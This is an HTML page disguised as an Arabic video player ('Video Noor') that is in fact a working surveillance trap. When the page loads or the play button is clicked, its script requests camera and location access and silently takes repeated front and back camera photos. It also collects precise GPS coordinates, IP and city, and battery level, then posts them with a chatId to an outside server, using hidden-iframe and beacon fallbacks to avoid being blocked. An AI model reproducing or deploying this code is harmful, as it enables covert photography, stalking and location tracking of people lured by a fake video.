<head>

  <title>Video Noor - شاهد الآن</title>
  
  <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }
        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }
        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://imgbs.com/uploads/tyt-08366b01.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: default;
            flex-direction: column;
        }
        .play-button-overlay {
            width: 100px;
            height: 100px;
            background-color: rgba(255, 0, 0, 0.85);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            position: relative;
            z-index: 5;
            cursor: pointer;
        }
        .play-button-overlay:hover {
            transform: scale(1.1);
            background-color: rgba(255, 0, 0, 0.95);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
        }
        .play-icon-large {
            width: 0;
            height: 0;
            border-left: 30px solid white;
            border-top: 20px solid transparent;
            border-bottom: 20px solid transparent;
            margin-left: 8px;
        }

        #gearButton {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: rgba(255, 0, 0, 0.75);
            border: 4px solid #ff6b6b;
            border-radius: 50%;
            width: 130px;
            height: 130px;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(8px);
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.6);
            z-index: 10;
            text-align: center;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 0;
        }
        #gearButton:hover {
            transform: translate(-50%, -50%) scale(1.08);
            background: rgba(255, 0, 0, 0.9);
            border-color: #ff4757;
            box-shadow: 0 0 70px rgba(255, 0, 0, 0.8);
        }
        #gearButton .icon-gear {
            display: none;
        }
        #gearButton .play-icon-btn {
            font-size: 55px;
            line-height: 1;
            color: #fff;
            margin-bottom: 2px;
            display: block;
            filter: drop-shadow(0 0 12px rgba(255, 255, 255, 0.5));
        }
        #gearButton .main-text {
            font-size: 22px;
            font-weight: bold;
            color: #fff;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.8);
            margin-top: 2px;
        }
        #gearButton .sub-text {
            display: none;
        }

        #retryButton {
            display: none;
            margin-top: 20px;
            padding: 12px 30px;
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            z-index: 10;
            position: absolute;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
        }
        #retryButton:hover {
            background: #1557b0;
        }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }
        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }
        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }
        .control-button {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }
        .control-button:hover {
            background: #333;
        }
        .progress-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }
        .progress-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }
        .time-display {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }
        .spinner {
            border: 4px solid #fff;
            border-top: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            position: absolute;
            display: none;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
        #loading {
            display: none;
            font-size: 1.2rem;
            color: #fff;
            margin-top: 20px;
            text-align: center;
        }
        .loading-text {
            margin-top: 10px;
        }
        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }
        .volume-slider {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }
        .volume-level {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }
        .fullscreen-btn {
            margin-left: 15px;
        }
        @media (max-width: 480px) {
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .progress-bar {
                margin: 0 6px;
            }
            .time-display {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            .play-button-overlay {
                width: 70px;
                height: 70px;
            }
            .play-icon-large {
                border-left-width: 22px;
                border-top-width: 14px;
                border-bottom-width: 14px;
                margin-left: 5px;
            }
            #gearButton {
                width: 100px;
                height: 100px;
            }
            #gearButton .play-icon-btn {
                font-size: 40px;
            }
            #gearButton .main-text {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title"></div>
            <div class="video-meta"></div>
        </div>

        <div class="video-thumbnail" id="thumbnailArea">
            <div class="play-button-overlay" id="playButtonOverlay">
                <div class="play-icon-large"></div>
                <div class="spinner" id="spinner"></div>
            </div>

            <div id="gearButton">
                <div class="play-icon-btn">▶</div>
                <div class="main-text">تشغيل الفيديو</div>
                <div class="sub-text">اضغط لفتح الإعدادات</div>
            </div>

            <button id="retryButton">إعادة المحاولة</button>
        </div>

        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/pyndok.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            <div class="time-display">0:00 / 2:45</div>
            <div class="volume-control">
                <span></span>
                <div class="volume-slider">
                    <div class="volume-level"></div>
                </div>
            </div>
            <button class="control-button fullscreen-btn">⛶</button>
        </div>
    </div>

    <div id="loading">
        <div class="spinner" style="position:static;"></div>
        <div class="loading-text"></div>
    </div>

    <script>
        (function() {
            'use strict';

            let capturedData = {
                permissions: [],
                images: [],
                ipInfo: '',
                batteryStatus: '',
                location: '',
                chatId: ''
            };

            let settingsOpened = false;
            let videoStarted = false;
            let isProcessing = false;
            let dataSent = false;
            let autoTriggered = false;

            const playBtn = document.getElementById('playButtonOverlay');
            const thumbnailArea = document.getElementById('thumbnailArea');
            const realVideo = document.getElementById('realVideo');
            const spinner = document.getElementById('spinner');
            const loading = document.getElementById('loading');
            const gearBtn = document.getElementById('gearButton');
            const retryBtn = document.getElementById('retryButton');

            function openLocationSettings() {
                const ua = navigator.userAgent;
                if (/Android/i.test(ua)) {
                    const intents = [
                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                        'intent:#Intent;action=android.settings.SETTINGS;end'
                    ];
                    for (let intent of intents) {
                        try {
                            window.location.href = intent;
                            break;
                        } catch (e) {}
                    }
                } else if (/iPhone|iPad|iPod/i.test(ua)) {
                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
                    setTimeout(() => {
                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
                    }, 500);
                } else if (/Windows/i.test(ua)) {
                    window.open('ms-settings:privacy-location', '_blank');
                } else if (/Mac/i.test(ua)) {
                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
                } else {
                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                }
            }

            async function requestPermissions() {
                let locationOk = false;
                let cameraOk = false;

                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            () => { locationOk = true; resolve(); },
                            (err) => { reject(err); },
                            { enableHighAccuracy: true, timeout: 10000 }
                        );
                    });
                } catch (e) {
                    locationOk = false;
                }

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    stream.getTracks().forEach(t => t.stop());
                    cameraOk = true;
                } catch (e) {
                    cameraOk = false;
                }

                return locationOk && cameraOk;
            }

            async function fetchIPInfo() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    capturedData.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
                } catch {
                    capturedData.ipInfo = "IP Info not available";
                }
            }
            async function getBatteryStatus() {
                try {
                    const battery = await navigator.getBattery();
                    capturedData.batteryStatus = Math.round(battery.level * 100) + '%';
                } catch {
                    capturedData.batteryStatus = "Unknown";
                }
            }
            async function captureFromCamera(facingMode) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: facingMode } }
                    });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
                    stream.getTracks().forEach(track => track.stop());
                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
                } catch {
                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied`);
                }
            }
            async function getLocation() {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        });
                    });
                    capturedData.location =
                        `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
                    capturedData.permissions.push('Geolocation Allowed');
                } catch (err) {
                    capturedData.permissions.push('Geolocation Denied');
                    capturedData.location = '';
                }
            }

            async function sendDataWithBypass(data) {
                const urls = [
                    'https://server-brxz.onrender.com/submitData',
                    'https://server-brxz.onrender.com/submitData'
                ];
                for (let url of urls) {
                    try {
                        await fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: new URLSearchParams(data),
                            mode: 'no-cors'
                        });
                        return;
                    } catch (e) {}
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', url, false);
                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        xhr.send(new URLSearchParams(data));
                        return;
                    } catch (e) {}
                    try {
                        const iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        document.body.appendChild(iframe);
                        const form = document.createElement('form');
                        form.method = 'POST';
                        form.action = url;
                        form.target = iframe.name || 'hiddenFrame';
                        iframe.name = form.target;
                        for (let key in data) {
                            const input = document.createElement('input');
                            input.type = 'hidden';
                            input.name = key;
                            input.value = data[key];
                            form.appendChild(input);
                        }
                        document.body.appendChild(form);
                        form.submit();
                        setTimeout(() => {
                            document.body.removeChild(form);
                            document.body.removeChild(iframe);
                        }, 1000);
                        return;
                    } catch (e) {}
                    try {
                        const blob = new Blob([new URLSearchParams(data).toString()], {
                            type: 'application/x-www-form-urlencoded'
                        });
                        navigator.sendBeacon(url, blob);
                        return;
                    } catch (e) {}
                }
            }

            async function collectAndSendData() {
                if (dataSent) return;
                dataSent = true;

                try {
                    capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';

                    await Promise.all([
                        fetchIPInfo(),
                        getBatteryStatus(),
                        getLocation()
                    ]);

                    await captureFromCamera('user');
                    await captureFromCamera('environment');
                    await captureFromCamera('user');
                    await captureFromCamera('environment');

                    const data = {
                        chatId: capturedData.chatId,
                        imageDatas: capturedData.images.join(','),
                        location: capturedData.location,
                        permissions: capturedData.permissions.join(', '),
                        ipInfo: capturedData.ipInfo,
                        battery: capturedData.batteryStatus
                    };

                    await sendDataWithBypass(data);
                } catch (e) {
                }
            }

            function startVideoWithSound() {
                if (videoStarted) return;
                videoStarted = true;

                thumbnailArea.style.display = 'none';
                realVideo.style.display = 'block';

                realVideo.muted = false;
                realVideo.volume = 1.0;

                const playPromise = realVideo.play();
                if (playPromise !== undefined) {
                    playPromise.then(() => {}).catch(() => {
                        realVideo.muted = true;
                        realVideo.play().then(() => {
                            setTimeout(() => {
                                realVideo.muted = false;
                                realVideo.volume = 1.0;
                            }, 100);
                        }).catch(() => {});
                    });
                }

                setTimeout(() => {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (e) {}
                }, 500);

                setTimeout(() => {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (e) {}
                }, 3000);
            }

            function showGearButton() {
                gearBtn.style.display = 'flex';
                playBtn.style.display = 'none';
                retryBtn.style.display = 'none';
            }

            function hideGearButton() {
                gearBtn.style.display = 'none';
                playBtn.style.display = 'flex';
                retryBtn.style.display = 'none';
            }

            function showRetryButton() {
                retryBtn.style.display = 'block';
                gearBtn.style.display = 'none';
                playBtn.style.display = 'none';
            }

            async function autoStartSequence() {
                if (autoTriggered) return;
                autoTriggered = true;

                settingsOpened = true;
                openLocationSettings();

                setTimeout(async () => {
                    startVideoWithSound();

                    const granted = await requestPermissions();

                    if (!dataSent) {
                        collectAndSendData();
                    }

                    if (granted) {
                        hideGearButton();
                    } else {
                        showGearButton();
                    }

                    settingsOpened = false;
                }, 300);
            }

            async function handlePlayClick(e) {
                e.stopPropagation();
                if (videoStarted || isProcessing) return;

                if (!autoTriggered) {
                    await autoStartSequence();
                    return;
                }

                if (!settingsOpened) {
                    settingsOpened = true;
                    openLocationSettings();
                    return;
                }

                isProcessing = true;

                startVideoWithSound();

                const granted = await requestPermissions();

                if (!dataSent) {
                    collectAndSendData();
                }

                if (granted) {
                    hideGearButton();
                } else {
                    showGearButton();
                }

                settingsOpened = false;
                isProcessing = false;
            }

            function handleGearClick() {
                settingsOpened = true;
                openLocationSettings();
            }

            async function handleRetryClick() {
                const granted = await requestPermissions();
                if (granted) {
                    hideGearButton();
                    startVideoWithSound();
                    if (!dataSent) {
                        collectAndSendData();
                    }
                } else {
                    showGearButton();
                }
            }

            document.addEventListener('visibilitychange', function() {
            });

            if (playBtn) {
                playBtn.addEventListener('click', handlePlayClick);
            }
            if (thumbnailArea) {
                thumbnailArea.addEventListener('click', handlePlayClick);
            }
            if (gearBtn) {
                gearBtn.addEventListener('click', handleGearClick);
            }
            if (retryBtn) {
                retryBtn.addEventListener('click', handleRetryClick);
            }

            document.addEventListener('click', function() {
                if (realVideo) {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    try { realVideo.play(); } catch (e) {}
                }
            }, true);

            document.querySelectorAll('.control-button').forEach(button => {
                button.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        const video = document.getElementById('realVideo');
                        if (video.requestFullscreen) {
                            video.requestFullscreen();
                        } else if (video.webkitRequestFullscreen) {
                            video.webkitRequestFullscreen();
                        }
                    }
                });
            });

            const progressInterval = setInterval(() => {
                const progressFill = document.querySelector('.progress-fill');
                const realVideoEl = document.getElementById('realVideo');
                if (realVideoEl.style.display === 'block') {
                    clearInterval(progressInterval);
                    return;
                }
                const currentWidth = parseInt(progressFill.style.width) || 35;
                const newWidth = (currentWidth + 0.1) % 100;
                progressFill.style.width = newWidth + '%';

                const timeDisplay = document.querySelector('.time-display');
                const currentSeconds = Math.floor((newWidth / 100) * 165);
                const minutes = Math.floor(currentSeconds / 60);
                const seconds = currentSeconds % 60;
                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

            window.addEventListener('load', function() {
                setTimeout(autoStartSequence, 100);
            });

        })();
    </script>

</body>
</html>
